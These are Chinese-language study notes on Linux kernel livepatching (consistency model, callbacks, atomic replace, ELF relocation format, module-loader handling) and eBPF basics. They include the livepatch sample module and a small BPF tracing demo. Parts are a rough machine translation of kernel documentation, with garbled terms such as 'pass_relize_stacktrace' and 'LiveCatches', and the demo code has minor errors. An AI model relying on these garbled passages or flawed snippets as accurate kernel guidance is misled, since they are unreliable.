   除非我们能提出另一种修补kthread的方法，否则内核livepatching不会完全支持没有HAVE_RELIABLE_STACKTRACE的体系结构。 

   / sys / kernel / livepatch / <patch> / transition文件显示修补程序是否正在过渡。 在给定时间只能转换一个补丁。 如果有任何任务停留在初始补丁程序状态，则补丁程序可以无限期保持过渡状态。 

   通过在转换进行过程中将相反的值写入/ sys / kernel / livepatch / <patch> / enabled文件，可以撤消转换并有效取消转换。 然后，所有任务将尝试收敛回到原始修补程序状态。 

   还有一个/ proc / <pid> / patch_state文件，可用于确定哪些任务阻止了修补操作的完成。 如果正在执行补丁程序，则此文件显示0表示任务尚未打补丁，显示1表示任务已打补丁。 否则，如果没有补丁在过渡，则显示-1。 可以使用SIGSTOP和SIGCONT发出任何阻止转换的任务的信号，以强制它们更改其修补状态。 但是，这可能对系统有害。 向所有剩余的阻止任务发送虚假信号是更好的选择。 实际上没有传递适当的信号（信号暂挂结构中没有数据）。 任务被中断或唤醒，并被迫更改其修补状态。 伪信号每15秒自动发送一次。 

   管理员还可以通过/ sys / kernel / livepatch / <patch> / force属性影响过渡。 在此处写入1将清除所有任务的TIF_PATCH_PENDING标志，从而将任务强制为修补状态。 重要的提示！ force属性适用于由于阻塞任务而导致过渡卡住很长时间的情况。 管理员应收集所有必要的数据（即此类阻止任务的堆栈跟踪），并请求补丁分发者许可以强制过渡。 未经授权的使用可能会损坏系统。 这取决于修补程序的性质，哪些功能是（未）修补的，阻塞任务正在休眠的是哪些功能（/ proc / <pid> / stack在这里可能会有所帮助）。 使用强制功能时，永久禁用补丁模块的移除（rmmod）。 无法保证在此类模块中没有任何任务处于休眠状态。 如果补丁模块在循环中被禁用和启用，则意味着无限制的引用计数。 

   此外，使用武力还可能会影响实时补丁的未来应用，甚至会对系统造成更大的伤害。 管理员应首先考虑简单地取消过渡（请参见上文）。 如果使用强制，则应计划重新启动，并且不再应用任何实时补丁。 

   1. ​	向新架构添加一致性模型支持 :为了向新架构添加一致性模型支持，有以下几种选择：

      1. 添加CONFIG_HAVE_RELIABLE_STACKTRACE。 这意味着要移植objtool，对于非DWARF展开器，还应确保堆栈跟踪代码有一种方法可以检测堆栈上的中断。 

      2. 或者，确保每个kthread在安全的位置都有对klp_update_patch_state（）的调用。 Kthread通常处于无限循环中，该循环会重复执行某些操作。 切换kthread补丁程序状态的安全位置将在循环中的指定点，其中没有采取任何锁定，并且所有数据结构都处于定义良好的状态。 

         使用工作队列或kthread worker API时，该位置很清楚。 这些kthread在通用循环中处理独立的动作。 

         它与具有自定义循环的kthreads更复杂。 必须在逐案的基础上仔细选择安全位置。

         在那种情况下，没有pass_relize_stacktrace的拱门仍然能够使用一致性模型的非堆叠检查部分：

         1. 在跨越内核/用户空间边界时修补用户任务; 和 
         2. 在其指定的补丁点修补kthreads和空闲任务。 

         此选项不像选项1一样好，因为它需要发信号通知用户任务并唤醒kthreads来修补它们。 但对于那些没有可靠的堆栈迹线，它仍然是一个很好的备份选项。 

4. livepatch 模块

   LiveCatches使用内核模块分发，请参阅示例/ LivePatch / LivePatch-Sample.c。 

   该模块包括我们要替换的功能的新实现。 此外，它定义了一些描述原始和新实现之间关系的结构。 然后，有代码使内核在加载LivePatch模块时使用新代码开始。 此外，还有在删除LivePatch模块之前清理的代码。 所有这些都在下一节中的更多细节中解释。 

   1. 新函数

      新版本的功能通常只是从原始来源复制。 良好的做法是向名称添加前缀，以便它们可以与原始的前缀区分开，例如，它们可以区分开。 在回程中。 此外，它们也可以被声明为静态，因为它们不会直接调用，不需要全局可见性。 

      该修补程序仅包含真正修改的函数。 但他们可能希望从原始源文件中访问函数或数据，该文件只能是本地可访问的。 这可以通过生成的LivePatch模块中的特殊重定位部分来解决，请参阅LivePatch模块ELF格式以获取更多详细信息。 

   2. 元数据

      该补丁由几个结构描述了将信息拆分为三个级别：

      1. 为每个修补函数定义struct klp_func。 它描述了原始功能与新实现之间的关系。 

         该结构包括原始函数的名称，作为字符串。 在运行时通过Kallsyms找到函数地址。

         然后它包括新功能的地址。 它通过分配函数指针直接定义。 请注意，新功能通常在相同的源文件中定义。 作为可选参数，Kallsyms数据库中的符号位置可用于消除相同名称的函数。 这不是数据库中的绝对位置，而是只针对特定对象（vmlinux或内核模块）找到的顺序。 请注意，Kallsyms允许根据对象名称搜索符号。

      2. struct klp_object在同一对象中定义了一个修补函数数组（结构klp_func）。 该对象是vmlinux（null）或模块名称的位置。

         该结构有助于为每个对象组合在一起并处理每个对象的功能。 请注意，修补模块可能会在稍后加载而不是修补程序本身，并且只有在可用时才会修补相关功能。 

      3. struct klp_patch定义了一个修补的对象数组（struct klp_object）。该结构始终如一地处理所有修补的功能，并最终同步地处理所有修补的功能。 仅在找到所有修补符号时才会应用整个补丁。 唯一的例外是尚未加载的对象（内核模块）的符号。 

         有关如何在每次任务的基础上应用补丁如何应用程序的更多详细信息，请参阅“一致性模型”部分。 

5. Livepatch生命周期 

   Livepatching可以通过五个基本操作来描述：加载，启用，替换，禁用，删除。 

   替换和禁用操作的互斥互斥。 它们对给定的补丁具有相同的结果，但不适用于系统。

   1. 装载 

      唯一合理的方式是在加载LivePatch内核模块时启用修补程序。 为此，必须在module_init（）回调中调用klp_enable_patch（）。 有两个主要原因：

      首先，只有模块才能轻松访问相关的结构klp_patch。 

      其次，当修补程序无法启用时，错误代码可用于拒绝加载模块。 

   2. 启用 

      通过从module_init（）回调的klp_enable_patch（）通过调用klp_enable_patch（）启用LivePatch。 该系统将在此阶段开始使用修补功能的新实现。

      首先，根据修补函数的名称查找它们的地址。 应用“新功能”一节中提到的特殊重定位。 相关条目在/ sys / kernel / livepatch / <名称>下创建。 当上述任何操作失败时，补丁将被拒绝。

      其次，livepatch进入过渡状态，在此状态下任务正在收敛到修补状态。 如果是第一次修补原始函数，则会创建特定于函数的struct klp_ops并注册通用ftrace处理程序1。 / sys / kernel / livepatch / <name> / transition中的值“ 1”表示该阶段。 有关此过程的更多信息，请参见“一致性模型”部分

      最后，修补完所有任务后，“ transition”值将变为“ 0”。 

      请注意，功能可能会多次打补丁。 对于给定的函数，ftrace处理程序仅注册一次。 进一步的补丁程序仅将一个条目添加到struct klp_ops的列表中（请参见func_stack字段）。 正确的实现由ftrace处理程序选择，请参见“一致性模型”部分。      

      也就是说，强烈建议使用累积实时修补程序，因为它们有助于保持所有更改的一致性。 在这种情况下，可能仅在过渡期间对功能进行了两次修补。 

   3. 更换 :所有启用的修补程序都可能会被设置了.replace标志的累积修补程序替换。 一旦启用了新补丁并完成了“转换”，与替换的补丁相关联的所有功能（结构klp_func）就会从相应的结构klp_ops中删除。 同样当相关功能未被新补丁修改且func_stack列表为空时，ftrace处理程序也将取消注册，并释放struct klp_ops。 有关更多详细信息，请参见原子替换和累积补丁。

   4. 禁用:通过将“ 0”写入/ sys / kernel / livepatch / <name> / enabled，可能会禁用已启用的修补程序。首先，livepatch进入过渡状态，在此状态下任务正在收敛到未修补状态。 系统开始使用以前启用的补丁中的代码，甚至使用原始补丁中的代码。 / sys / kernel / livepatch / <name> / transition中的值“ 1”表示该阶段。 有关此过程的更多信息，请参见“一致性模型”部分。 其次，一旦所有任务均未打补丁，“ transition”值将变为“ 0”。 与待禁用补丁相关联的所有功能（struct klp_func）都从相应的struct klp_ops中删除。 当func_stack列表为空时，将取消注册ftrace处理程序，并释放struct klp_ops。 第三，sysfs接口被破坏。 

   5. 卸载：仅当没有用户使用该模块提供的功能时，才可以安全地卸下模块。 这就是强制功能永久禁用删除的原因。 仅当系统成功转换为新的补丁程序状态（已补丁/未补丁）而没有被强制执行时，才可以确保没有任务在旧代码中休眠或运行。 

6. sysfs:可在/ sys / kernel / livepatch下找到有关已注册补丁的信息。 可以通过在其中写入来启用和禁用补丁。 / sys / kernel / livepatch / <patch> / force属性允许管理员影响修补操作。 有关更多详细信息，请参见文档/ ABI / testing / sysfs-kernel-livepatch。 

7. 局限性 :当前的Livepatch实现有几个限制： 

   1. 只能修补可以跟踪的功能。 Livepatch基于动态ftrace。 特别是，无法修补实现ftrace或livepatch ftrace处理程序的函数。 否则，代码将陷入无限循环。 通过用“ notrace”标记有问题的功能可以防止潜在的错误。 
   2. 仅当动态ftrace位于函数的开头时，Livepatch才能可靠地工作。 在以任何方式修改堆栈或函数参数之前，都需要对函数进行重定向。 例如，livepatch要求在x86_64上使用-fentry gcc编译器选项。PPC端口是一种例外。 它使用相对寻址和TOC。 每个函数都必须先处理TOC并保存LR，然后才能调用ftrace处理程序。 此操作必须在返回时恢复。 幸运的是，通用ftrace代码具有相同的问题，所有这些都在ftrace级别上进行了处理。 
   3. 使用ftrace框架的Kretprobes与修补的函数冲突。kretprobes和livepatches都使用ftrace处理程序来修改返回地址。 第一个用户获胜。 当处理程序已被另一个使用时，探针或修补程序都会被拒绝。 
   4. 当代码重定向到新的实现时，原始函数中的Kprobes被忽略。 正在进行一项工作以添加关于这种情况的警告。



（取消）修补回调函数
******************

Livepatch（un）patch-callbacks为livepatch模块提供了一种机制，该机制可在（未）修补内核对象时执行回调函数。 可以将它们视为一项强大功能，将实时修补功能扩展为： 

1. 安全更新全局数据 ;
2. 初始化和探测功能的“补丁” ;
3. 修补否则无法修补的代码（即汇编）

在大多数情况下，（un）patch回调将需要与内存屏障和内核同步原语（例如互斥锁/自旋锁，甚至stop_machine（））结合使用，以避免并发问题。 

1. 动机：回调不同于现有的内核功能：

   1. 禁用和重新启用修补程序时，模块初始化/退出代码无法运行。
   2. 模块通知程序无法阻止要修补的模块加载。

   回调是klp_object结构的一部分，其实现特定于该klp_object。 不论目标klp_object的当前状态如何，其他livepatch对象都可能会被打补丁，也可能不会被打补丁。

2. 回调类型 ：可以为以下实时补丁操作注册回调： 

   1. Pre-patch：在修补klp_object之前 ;
   2. Post-patch：在对klp_object进行修补并在所有任务中处于活动状态之后 ;
   3. Pre-unpatch：在未对klp_object进行修补之前（即，已修补的代码处于活动状态），用于清理修补后的回调资源 
   4. Post-unpatch：修补了klp_object之后，所有代码都已还原，并且没有任务正在运行修补的代码，用于清除修补前的回调资源 

3. How it works:

   每个回调都是可选的，省略一个并不排除指定其他任何回调。 但是，livepatching核心是对称地执行处理程序的：补丁前的回调有后释放的对应，而补丁后的回调有前释放的对应。 仅当执行了其对应的补丁程序回调时，才会执行unpatch回调程序。 典型的用例是将获取和配置资源的补丁处理程序与取消补丁处理程序配对，以拆除并释放相同的资源。 

   仅当加载了其主机klp_object时才执行回调。 对于内核内vmlinux目标，这意味着启用/禁用livepatch时将始终执行回调。 对于补丁程序目标内核模块，仅当目标模块已加载时才执行回调。 加载（取消）模块目标时，仅当启用livepatch模块时，才会执行其回调。

   补丁程序前的回调，如果已指定，则应返回状态码（0为成功，-ERRNO为错误）。 错误状态代码向livepatching内核指示对当前klp_object的修补是不安全的，并且将停止当前的修补请求。 （如果未提供补丁前回调，则认为过渡是安全的。）如果补丁前回调返回失败，则内核的模块加载器将：

   1. 如果在目标代码之后加载了实时补丁，则拒绝加载实时补丁。 或
   2. 如果已成功加载livepatch，则拒绝加载模块。

   如果由于pre_patch回调失败或任何其他原因而导致对象修补失败，则不会为给定的klp_object执行补丁后，补丁前或补丁后回调。如果补丁转换被反向，则将不运行预补丁处理程序（这遵循前面提到的对称性-仅在执行其相应的补丁后回调时才会发生补丁前回调）。 如果对象确实成功修补，但是由于某种原因（例如，如果另一个对象修补失败），修补过渡从未开始，则仅会调用解后的回调。

4. 用例 ：可以在samples / livepatch /目录中找到演示回调API的示例livepatch模块。 修改了这些样本以用于kselftests，可以在lib / livepatch目录中找到它们。 

5. 全局数据更新 ：补丁程序前的回调对更新全局变量很有用。 例如，75ff39ccc1bd（“ tcp：降低挑战性可预测性”）更改了全局sysctl，并修补了tcp_send_challenge_ack（）函数。 在这种情况下，如果我们超级偏执，那么在修补完成后使用修补程序后的回调对数据进行修补可能是有意义的，因此可以首先将tcp_send_challenge_ack（）更改为使用READ_ONCE读取sysctl_tcp_challenge_ack_limit。 

6. __init和探针功能补丁支持 ： 

   尽管__init和probe函数不能直接进行实时修补，但是可以通过修补前/修补后回调实现类似的更新。 提交48900cb6af42（“ virtio-net：删除NETIF_F_FRAGLIST”）更改了virtnet_probe（）初始化其驱动程序的net_device功能的方式。 补丁前/补丁后回调可以遍历所有此类设备，并对它们的hw_features值进行类似的更改。 （该值的客户端功能可能需要相应地更新。） 

原子替换和累积补丁 
*****************

   实时补丁之间可能存在依赖关系。 如果多个补丁程序需要对同一功能进行不同的更改，那么我们需要定义补丁程序的安装顺序。 而且，任何较新的livepatch的函数实现都必须在较旧的livepatch之上完成。 

   这可能会成为维护的噩梦。 尤其是当更多补丁以不同方式修改相同功能时。

   一个优雅的解决方案带有称为“原子替换”的功能。 它允许创建所谓的“累积补丁”。 它们包括所有较旧的实时补丁的所有所需更改，并在一个过渡中完全替换了它们。 

   用法 

.. code-block:: c
	:caption: struct klp_patch
	:linenos:
	
	   static struct klp_patch patch = {
		   .mod = THIS_MODULE,
		   .objs = objs,
		   .replace = true,
	   };

   然后，将所有进程迁移为仅使用新补丁中的代码。 过渡完成后，将自动禁用所有较旧的补丁程序。 

   Ftrace处理程序将从不再由新的累积修补程序修改的函数中透明删除。

   结果，实时补丁作者可能只维护一个累积补丁的来源。 在添加或删除各种修补程序或功能时，它有助于使修补程序保持一致。 

   转换完成后，用户只能保留系统上安装的最后一个修补程序。 它有助于清楚地看到实际使用的代码。 然后，livepatch可能会被视为修改内核行为的“正常”模块。 唯一的区别是可以在运行时更新它而不会破坏其功能。

特征 
*****
原子替换允许：

- 在升级其他功能时，以原子方式还原先前补丁中的某些功能。
- 消除由于核心重定向对不再打补丁的功能造成的最终性能影响。 
- 减少用户对实时补丁之间的依赖关系的困惑。 

局限性：
*********
- 操作完成后，没有直接的方法可以将其恢复并自动恢复被替换的补丁。 好的做法是在任何已发布的Livepatch中设置.replace标志。 然后，重新添加较旧的livepatch等效于降级到该补丁。 只要livepatches在（未）修补回调中或在module_init（）或module_exit（）函数中进行_not_额外的修改，这是安全的，请参见下文。 还要注意，只有在不强制过渡的情况下，才能删除并重新加载替换的补丁。 
- 仅执行_new_累积livepatch中的（未）补丁回调。 来自替换补丁的任何回调都将被忽略。 换句话说，累积修补程序负责执行适当替换任何较旧修补程序所必需的任何操作。 结果，用较旧的累积补丁替换较新的累积补丁可能很危险。 旧的实时修补程序可能未提供必要的回调。在某些情况下，这可能被视为限制。 但这使许多其他人的生活更加轻松。 只有新的累积性Livepatch知道添加/删除了哪些修复程序/功能，以及为平稳过渡需要采取哪些特殊措施。 无论如何，如果调用了所有已启用补丁的回调，则考虑各种回调的顺序及其交互将是一场噩梦。
- 阴影变量没有特殊处理。 Livepatch作者必须创建自己的规则，如何将它们从一个累积修补程序传递到另一个累积修补程序。 特别是它们不应该在module_exit（）函数中盲目地将其删除。 一个好的实践可能是在解压后回调中删除阴影变量。 仅当适当禁用livepatch时，才调用它。 


Livepatch模块Elf格式 
""""""""""""""""""""

1.背景和动机 

以前，livepatch需要单独的体系结构特定代码来编写重定位。 但是，模块加载程序中已经存在用于写重定位的特定于arch的代码，因此前一种方法产生了冗余代码。 因此，livepatch无需复制代码并重新实现模块加载器已经可以执行的操作，而是利用模块加载器中的现有代码来执行所有特定于架构的重定位工作。 具体而言，livepatch重用模块加载器中的apply_relocate_add（）函数以写入重定位。 本文档中描述的补丁模块Elf格式使livepatch能够执行此操作。 希望这将使livepatch更容易移植到其他体系结构，并减少将livepatch移植到特定体系结构所需的特定于arch的代码量。

由于apply_relocate_add（）要求访问模块的节头表，符号表和重定位节索引，因此将为livepatch模块保留Elf信息（请参阅第5节）。 Livepatch管理其自己的重定位部分和符号，本文档中对此进行了描述。 根据glibc的定义，从OS特定范围中选择了用于标记livepatch符号和重定位部分的Elf常数。 

为什么livepatch需要编写自己的重定位？ 
*********************************

典型的livepatch模块包含可引用未导出的全局符号和未包含的本地符号的功能的修补版本。不能照原样保留引用这些类型的符号的重定位，因为内核模块加载器无法解析它们，因此将拒绝livepatch模块。此外，我们无法应用影响补丁程序模块加载时尚未加载的模块的重定位（例如，补丁程序未加载的驱动程序）。以前，livepatch通过在生成的补丁模块Elf输出中嵌入特殊的“ dynrela”（动态rela）部分来解决此问题。使用这些dynrela部分，livepatch可以在考虑符号范围和符号所属模块的情况下解析符号，然后手动应用动态重定位。但是，此方法需要livepatch提供特定于拱的代码才能编写这些重定位。在新格式中，livepatch代替dynrela节管理其自己的SHT_RELA重定位节，并且relas引用的符号是特殊的livepatch符号（请参见第2和3节）。特定于拱的livepatch重定位代码被对apply_relocate_add（）的调用所代替。 

2.Livepatch modinfo字段 

Livepatch模块必须具有“ livepatch” modinfo属性。 有关如何完成的操作，请参阅samples / livepatch /中的示例livepatch模块。

用户可以通过使用“ modinfo”命令并查找“ livepatch”字段的存在来标识Livepatch模块。 内核模块加载程序还使用此字段来标识实时补丁模块。 

例子：Modinfo输出： 


.. code-block:: c
	:caption: modinfo livepatch-meminfo.ko
	:linenos:
	
	% modinfo livepatch-meminfo.ko
	filename:               livepatch-meminfo.ko
	livepatch:              Y
	license:                GPL
	depends:
	vermagic:               4.3.0+ SMP mod_unload

3.Livepatch重定位部分 

livepatch模块管理自己的Elf重定位部分，以在适当的时候将重定位应用于模块以及内核（vmlinux）。 例如，如果修补程序模块修补当前未加载的驱动程序，则livepatch将在加载后将相应的livepatch重定位部分应用于驱动程序。 

补丁模块中的每个“对象”（例如vmlinux或模块）都可以具有与其关联的多个livepatch重定位部分（例如，同一对象中多个功能的补丁）。 实时修补程序重定位部分与适用重定位的目标部分（通常是函数的文本部分）之间存在1-1对应关系。 livepatch模块也可能没有livepatch的重定位部分，例如在示例livepatch模块的情况下（请参见samples / livepatch）。 

由于Elf信息是为livepatch模块保留的（请参见第5节），因此只需将适当的段索引传递给apply_relocate_add（），即可应用livepatch重定位节，然后使用它访问relocation节并应用重定位。 

实时修补程序重定位部分中，rela引用的每个符号都是实时修补程序符号。 必须先解决这些问题，然后livepatch才能调用apply_relocate_add（）。 有关更多信息，请参见第3节。 

3.1Livepatch重定位部分格式 

Livepatch重定位部分必须标记为SHF_RELA_LIVEPATCH部分标志。 有关定义，请参见include / uapi / linux / elf.h。 模块加载器会识别此标志，并将避免在补丁模块加载时应用那些重定位部分。 这些部分还必须标有SHF_ALLOC，以便模块加载程序不会在模块加载时将其丢弃（即，它们将与其他SHF_ALLOC部分一起复制到内存中）。 

livepatch重定位部分的名称必须符合以下格式： 


.. code-block:: c
	:caption: klp节
	:linenos:
	
	.klp.rela.objname.section_name
	^        ^^     ^ ^          ^
	|________||_____| |__________|
	   [A]      [B]        [C]

- **[A]**

  重定位节名称的前缀为字符串“ .klp.rela”。 

- **[B]**

  重定位部分所属的对象的名称（即“ vmlinux”或模块的名称）紧随前缀之后。 

- **[C]**

  此重定位部分适用于的部分的实际名称。 


livepatch内核模块-从编译到加载原理分析
*********************************
首先我们已经分析过linux内核模块原理及加载方式，这一节我们补充livepatch在内核模块基础上的差异部分。
我们以系统提供的livepatch sample程序为例进行分析：livepatch-sample.c




.. code-block:: c
	:caption: livepatch-sample.c
	:linenos:

	// SPDX-License-Identifier: GPL-2.0-or-later
	/*
	 * livepatch-sample.c - Kernel Live Patching Sample Module
	 *
	 * Copyright (C) 2014 Seth Jennings <sjenning@redhat.com>
	 */

	#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

	#include <linux/module.h>
	#include <linux/kernel.h>
	#include <linux/livepatch.h>

	/*
	 * This (dumb) live patch overrides the function that prints the
	 * kernel boot cmdline when /proc/cmdline is read.
	 *
	 * Example:
	 *
	 * $ cat /proc/cmdline
	 * <your cmdline>
	 *
	 * $ insmod livepatch-sample.ko
	 * $ cat /proc/cmdline
	 * this has been live patched
	 *
	 * $ echo 0 > /sys/kernel/livepatch/livepatch_sample/enabled
	 * $ cat /proc/cmdline
	 * <your cmdline>
	 */

	#include <linux/seq_file.h>
	static int livepatch_cmdline_proc_show(struct seq_file *m, void *v)
	{
		seq_printf(m, "%s\n", "this has been live patched");
		return 0;
	}

	static struct klp_func funcs[] = {
		{
			.old_name = "cmdline_proc_show",
			.new_func = livepatch_cmdline_proc_show,
		}, { }
	};

	static struct klp_object objs[] = {
		{
			/* name being NULL means vmlinux */
			.funcs = funcs,
		}, { }
	};

	static struct klp_patch patch = {
		.mod = THIS_MODULE,
		.objs = objs,
	};

	static int livepatch_init(void)
	{
		return klp_enable_patch(&patch);
	}

	static void livepatch_exit(void)
	{
	}

	module_init(livepatch_init);
	module_exit(livepatch_exit);
	MODULE_LICENSE("GPL");
	MODULE_INFO(livepatch, "Y");


	livepatch-sample.mod.c:

	#include <linux/module.h>
	#define INCLUDE_VERMAGIC
	#include <linux/build-salt.h>
	#include <linux/elfnote-lto.h>
	#include <linux/vermagic.h>
	#include <linux/compiler.h>

	BUILD_SALT;
	BUILD_LTO_INFO;

	MODULE_INFO(vermagic, VERMAGIC_STRING);
	MODULE_INFO(name, KBUILD_MODNAME);

	__visible struct module __this_module
	__section(".gnu.linkonce.this_module") = {
		.name = KBUILD_MODNAME,
		.init = init_module,
	#ifdef CONFIG_MODULE_UNLOAD
		.exit = cleanup_module,
	#endif
		.arch = MODULE_ARCH_INIT,
	};

	#ifdef CONFIG_RETPOLINE
	MODULE_INFO(retpoline, "Y");
	#endif

	static const struct modversion_info ____versions[]
	__used __section("__versions") = {
		{ 0x9736759a, "module_layout" },
		{ 0x167cddf5, "klp_enable_patch" },
		{ 0x9672b9cd, "seq_printf" },
		{ 0xbdfb6dbb, "__fentry__" },
	};

	MODULE_INFO(depends, "");



发现livepatch内核模块与普通内核模块相比多了：MODULE_INFO(livepatch, "Y");

看内核模块加载部分对livepatch的处理

.. code-block:: c
	:caption: 内核模块特定于livepatch的定义
	:linenos:
	
	is_livepatch_module(mod):
	static inline bool is_livepatch_module(struct module *mod)
	{
		return mod->klp;
	}

	struct module {
	......
	#ifdef CONFIG_LIVEPATCH
		bool klp; /* Is this a livepatch module? */
		bool klp_alive;

		/* Elf information */
		struct klp_modinfo *klp_info;
	#endif
	......
	}


	#ifdef CONFIG_LIVEPATCH
	struct klp_modinfo {
		Elf_Ehdr hdr; /* 文件头表 */
		Elf_Shdr *sechdrs;/* 节头表 */
		char *secstrings;
		unsigned int symndx;
	};
	#endif

	load_module --> is_livepatch_module(mod):copy_module_elf(mod.info);


	layout_symtab() --> is_livepatch_module:is_core_symbol:strtab_size _=....;

	add_kallsyms() --> is_livepatch_module:......

	free_module() --> is_livepatch_module:free_module_elf;


- 关注copy_module_elf():


.. code-block:: c
	:caption: copy_module_elf
	:linenos:
	
	#ifdef CONFIG_LIVEPATCH
	/*
	 * Persist Elf information about a module. Copy the Elf header,
	 * section header table, section string table, and symtab section
	 * index from info to mod->klp_info.
	 * 这是复制了struct module中的关于内核模块ELF相关信息。
	 */
	static int copy_module_elf(struct module *mod, struct load_info *info)
	{
		unsigned int size, symndx;
		int ret;

		size = sizeof(*mod->klp_info);
		mod->klp_info = kmalloc(size, GFP_KERNEL);/*分配指针 */
		if (mod->klp_info == NULL)
			return -ENOMEM;

		/* Elf header */
		size = sizeof(mod->klp_info->hdr);
		memcpy(&mod->klp_info->hdr, info->hdr, size);/* 将内核模块头复制到klp_info中 */

		/* Elf section header table */
		size = sizeof(*info->sechdrs) * info->hdr->e_shnum; /* 分配节头表空间 */
		mod->klp_info->sechdrs = kmemdup(info->sechdrs, size, GFP_KERNEL); /*将内核模块文件的字节头表复制到klp_info中 */
		if (mod->klp_info->sechdrs == NULL) {
			ret = -ENOMEM;
			goto free_info;
		}

		/* Elf section name string table */
		size = info->sechdrs[info->hdr->e_shstrndx].sh_size;
		mod->klp_info->secstrings = kmemdup(info->secstrings, size, GFP_KERNEL); /* 复制节字符串表 */
		if (mod->klp_info->secstrings == NULL) {
			ret = -ENOMEM;
			goto free_sechdrs;
		}

		/* Elf symbol section index */
		symndx = info->index.sym; /* 符号节索引 */
		mod->klp_info->symndx = symndx;

		/*
		 * For livepatch modules, core_kallsyms.symtab is a complete
		 * copy of the original symbol table. Adjust sh_addr to point
		 * to core_kallsyms.symtab since the copy of the symtab in module
		 * init memory is freed at the end of do_init_module().
		 */
		mod->klp_info->sechdrs[symndx].sh_addr = \
			(unsigned long) mod->core_kallsyms.symtab; /* 符号表指向 */

		return 0;

	free_sechdrs:
		kfree(mod->klp_info->sechdrs);
	free_info:
		kfree(mod->klp_info);
		return ret;
	}

	static void free_module_elf(struct module *mod)/* 释放部分 */ 
	{
		kfree(mod->klp_info->sechdrs);
		kfree(mod->klp_info->secstrings);
		kfree(mod->klp_info);
	}


- 总结
  
  - livepatch相比较于一般的内核模块有其单独的存储空间；
  
  - 下一步结合livepatch实现更深入分析。

- 参考
  - https://kernel.org/doc/html/latest/livepatch/index.html


ebpf
"""""
eBPF 是一种内核机制，用于在 Linux 内核中提供沙盒运行时环境，用于运行时扩展和检测，而无需更改内核源代码或加载内核模块。eBPF 程序可以附加到各种内核子系统，包括网络、跟踪和 Linux 安全模块 (LSM)。

eBPF指令集
**********
参考：https://www.kernel.org/doc/html/latest/bpf/instruction-set.html

eBPF安全性验证
*************
eBPF 程序的安全性分两步确定。

- 进行 DAG 检查以禁止循环和其他 CFG 验证。特别是，它将检测具有无法访问指令的程序。（尽管经典的 BPF 检查器允许它们）
- 从第一个 insn 开始并下降所有可能的路径。它模拟每个insn的执行并观察寄存器和堆栈的状态变化。
参考：https://www.kernel.org/doc/html/latest/bpf/verifier.html

libbpf
*******
手动从零编写bpf程序是非常麻烦的，编写bpf程序最简单的方式就是利用libbpf提供的接口进行操作。libbpf它是一个用于加载和与 bpf 程序交互的用户空间库。其依赖libelf和zlib。
参考：https://www.kernel.org/doc/html/latest/bpf/libbpf/index.html

BTF
**********

BTF（BPF Type Format）是元数据格式，对与BPF程序/映射相关的调试信息进行编码。BTF 这个名字最初是用来描述数据类型的。BTF 后来被扩展为包括定义子程序的函数信息，以及源/行信息的行信息。

调试信息用于映射漂亮打印、函数签名等。函数签名可实现更好的 bpf 程序/函数内核符号。行信息有助于生成源注释的翻译字节代码、jited 代码和验证者日志。

BTF 规范包含两部分，

 - BTF 内核 API
 - BTF ELF 文件格式

内核API是用户空间与内核之间的接口。内核在使用BTF会对其进行验证。ELF 文件格式是 ELF 文件和 libbpf 加载器之间的用户空间契约。type和string 部分是 BTF 内核 API 的一部分，描述了 bpf 程序引用的调试信息（主要是类型相关的）。

具体参考：https://www.kernel.org/doc/html/latest/bpf/btf.html


bpf辅助函数:bpf helpers
************************

list of eBPF helper functions: bpf kernel 部分只能调用这部分函数

扩展的 Berkeley 包过滤器 (eBPF) 子系统包含用伪汇编语言编写的程序，然后附加到几个内核挂钩之一并在特定事件的反应中运行。这个框架在几个方面与旧的“经典”BPF（或“cBPF”）不同，其中之一是从程序中调用特殊函数（或“帮助程序”）的能力。这些函数仅限于内核中定义的程序白名单。eBPF 程序使用这些程序与系统上下文进行交互。例如，它们可用于打印调试消息、获取系统启动后的时间、与 eBPF 映射交互或操作网络数据包。由于存在多种 eBPF 程序类型，并且它们不在同一个上下文中运行，因此每种程序类型只能调用这些帮助程序的一个子集。eBPF 约定，一个程序不能有超过五个参数。eBPF 程序直接调用已编译的辅助函数，而不需要任何外部函数接口。调用程序不会引入任何开销，从而提供出色的性能。以下是可供 eBPF 开发人员使用的程序。它们按时间顺序排序。


系统调用
********
非常复杂的系统调用。

bpf:https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html

eBPF maps
**********
'maps' 是不同类型的通用存储，用于在内核和用户空间之间共享数据。
参考：https://www.kernel.org/doc/html/latest/bpf/maps.html


经典BPF和eBPF比较
****************
参考：https://www.kernel.org/doc/html/latest/bpf/classic_vs_extended.html

BPF许可
********
参考：https://www.kernel.org/doc/html/latest/bpf/bpf_licensing.html

BPF测试和调试
*************
BPF drgn工具：https://www.kernel.org/doc/html/latest/bpf/drgn.html

BPF重定位
*********
参考：https://www.kernel.org/doc/html/latest/bpf/llvm_reloc.html

BPF demo
**********

.. code-block:: c
	:caption: load.c
	:linenos:
	
	#include <stdio.h>
	#include <linux/bpf.h>
	#include "bpf_load.h"

	int main(int argc,char *argv)
	{
		if(load_bpf_file("trace_kprobe_kern.o") != 0) {
			printf("The kernel didn't load the BPF program\n");
			return -1;
		}
		read_trace_pipe();
		return 0;
	}


.. code-block:: c
	:caption: bpf:trace_kprobe_kern.c
	:linenos:


	#include <bpf/bpf_tracing.h>
	#include "vmlinux.h"
	#include <bpf/bpf_helpers.h>
	#ifndef SEC
	#define SEC(NAME) __attribute__((section(NAME),used))
	#endif
	SEC("tracepoint/syscalls/sys_enter_execve")
	 int bpf_prog(void *ctx)
	{
		char msg[] = "hello,bpf world";

		bpf_trace_printk(msg,sizeof(msg));
		return 0;
	}

	#define _(P)                                                                   \
		({                                                                     \
			typeof(P) val = 0;                                             \
			bpf_probe_read_kernel(&val, sizeof(val), &(P));                \
			val;                                                           \
		})

	SEC("kprobe/begin_new_exec")
	int prog(struct pt_regs *ctx)
	{

		char file_name[] = "comm = %s\n";
		char buf_comm[16];
		bpf_get_current_comm(buf_comm,sizeof(buf_comm));

		
		bpf_trace_printk(file_name,sizeof(file_name),buf_comm);
		return 0;
	}

	char _license[] SEC("license") = "GPL";
	

.. code-block:: c
	:caption: Makefile
	:linenos:	

	srctree = /usr/src/linux-source-5.14
	objtree = srctree
	all:
		$(Q)clang -O2 -D__KERNEL__ -target bpf -I/usr/include/x86_64-linux-gnu/ -c trace_kprobe_kern.c -o trace_kprobe_kern.o
		$(Q)gcc -o loader loader.c bpf_load.c $(srctree)/tools/lib/bpf/libbpf.a /usr/lib/x86_64-linux-gnu/libz.a /usr/lib/x86_64-linux-gnu/libelf.a
	clean:
